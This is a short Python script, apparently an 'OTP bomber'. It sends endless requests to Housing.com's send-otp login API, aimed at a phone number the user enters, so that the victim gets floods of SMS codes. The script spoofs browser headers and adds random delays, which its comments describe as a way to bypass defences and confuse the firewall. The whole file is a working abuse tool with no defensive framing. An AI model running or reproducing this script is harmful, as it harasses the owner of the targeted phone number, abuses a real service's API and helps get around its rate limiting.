import requests
import random
import time

def heavy_bombing_infinite(target):
    # Housing.com specific configuration
    housing_url = "https://login.housing.com/api/v2/send-otp"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://housing.com",
        "Referer": "https://housing.com/"
    }

    print(f"🚀 [ULTIMATE ATTACK] Started on: {target}")
    print("---------------------------------------------")
    print("Press Ctrl+C to Exit the Attack\n")

    count = 1
    while True:
        try:
            # Housing API call
            payload = {"phone": target}
            res = requests.post(housing_url, json=payload, headers=headers, timeout=10)
            
            if res.status_code == 200:
                print(f"[{count}] [✔] Housing.com: OTP Triggered Successfully!")
            else:
                print(f"[{count}] [!] Housing.com: Status {res.status_code} (Blocked or Rate-Limited)")

        except Exception as e:
            print(f"[{count}] [✘] Connection Error: {e}")

        # Random Jitter (Bypass Defense)
        # Yeh kabhi 0.5, kabhi 1, kabhi 2 to kabhi 4 second rukega
        sleep_time = random.choice([0.5, 1, 2, 4])
        print(f"...Waiting {sleep_time}s to confuse the Firewall...\n")
        time.sleep(sleep_time)
        
        count += 1

if __name__ == "__main__":
    num = input("Enter Target Number (10 digits): ")
    try:
        heavy_bombing_infinite(num)
    except KeyboardInterrupt:
        print("\n\n🛑 Attack Manually Stopped. Assignment Ready!")
